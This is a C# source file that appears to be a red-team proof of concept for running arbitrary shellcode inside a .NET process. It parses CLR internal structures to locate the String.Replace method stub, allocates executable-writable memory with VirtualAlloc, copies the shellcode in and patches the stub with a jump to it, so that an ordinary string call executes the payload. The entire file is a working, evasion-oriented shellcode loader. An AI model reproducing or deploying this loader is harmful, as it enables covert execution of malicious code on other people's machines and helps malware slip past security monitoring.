using System;
using System.Runtime.InteropServices;

namespace NautilusProject
{
    public class ExecStubOverwrite
    {
        public static void Execute(byte[] shellcode)
        {
            // mov rax, 0x4141414141414141
            // jmp rax
            var jmpCode = new byte[] { 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xE0 };

            var t = typeof(System.String);
            var mt = Marshal.PtrToStructure<Internals.MethodTable>(t.TypeHandle.Value);
            var ec = Marshal.PtrToStructure<Internals.EEClass>(mt.m_pEEClass);
            var mdc = Marshal.PtrToStructure<Internals.MethodDescChunk>(ec.m_pChunks);
            var md = Marshal.PtrToStructure<Internals.MethodDesc>(ec.m_pChunks + 0x18);

            if ((md.m_wFlags & Internals.mdcHasNonVtableSlot) != Internals.mdcHasNonVtableSlot)
            {
                Console.WriteLine("[x] Error: mdcHasNonVtableSlot not set for this MethodDesc");
                return;
            }

            // Get the String.Replace method stub
            IntPtr stub = Marshal.ReadIntPtr(ec.m_pChunks + 0x18 + 8);

            // Alloc mem with p/invoke for now...
            var mem = Internals.VirtualAlloc(IntPtr.Zero, shellcode.Length, Internals.AllocationType.Commit | Internals.AllocationType.Reserve, Internals.MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(shellcode, 0, mem, shellcode.Length);

            // Point the stub to our shellcode
            Marshal.Copy(jmpCode, 0, stub, jmpCode.Length);
            Marshal.WriteIntPtr(stub + 2, mem);

            // FIRE!!
            "ANYSTRING".Replace("XPN", "WAZ'ERE", true, null);
        }
    }

    public static class Internals
    {
        [StructLayout(LayoutKind.Explicit)]
        public struct MethodTable
        {
            [FieldOffset(0)]
            public uint m_dwFlags;

            [FieldOffset(0x4)]
            public uint m_BaseSize;

            [FieldOffset(0x8)]
            public ushort m_wFlags2;

            [FieldOffset(0x0a)]
            public ushort m_wToken;

            [FieldOffset(0x0c)]
            public ushort m_wNumVirtuals;

            [FieldOffset(0x0e)]
            public ushort m_wNumInterfaces;

            [FieldOffset(0x10)]
            public IntPtr m_pParentMethodTable;

            [FieldOffset(0x18)]
            public IntPtr m_pLoaderModule;

            [FieldOffset(0x20)]
            public IntPtr m_pWriteableData;

            [FieldOffset(0x28)]
            public IntPtr m_pEEClass;

            [FieldOffset(0x30)]
            public IntPtr m_pPerInstInfo;

            [FieldOffset(0x38)]
            public IntPtr m_pInterfaceMap;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct EEClass
        {
            [FieldOffset(0)]
            public IntPtr m_pGuidInfo;

            [FieldOffset(0x8)]
            public IntPtr m_rpOptionalFields;

            [FieldOffset(0x10)]
            public IntPtr m_pMethodTable;

            [FieldOffset(0x18)]
            public IntPtr m_pFieldDescList;

            [FieldOffset(0x20)]
            public IntPtr m_pChunks;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct MethodDescChunk
        {
            [FieldOffset(0)]
            public IntPtr m_methodTable;

            [FieldOffset(8)]
            public IntPtr m_next;

            [FieldOffset(0x10)]
            public byte m_size;

            [FieldOffset(0x11)]
            public byte m_count;

            [FieldOffset(0x12)]
            public byte m_flagsAndTokenRange;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct MethodDesc
        {
            [FieldOffset(0)]
            public ushort m_wFlags3AndTokenRemainder;

            [FieldOffset(2)]
            public byte m_chunkIndex;

            [FieldOffset(0x3)]
            public byte m_bFlags2;

            [FieldOffset(0x4)]
            public ushort m_wSlotNumber;

            [FieldOffset(0x6)]
            public ushort m_wFlags;

            [FieldOffset(0x8)]
            public IntPtr TempEntry;
        }

        public const int mdcHasNonVtableSlot = 0x0008;

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
    }
}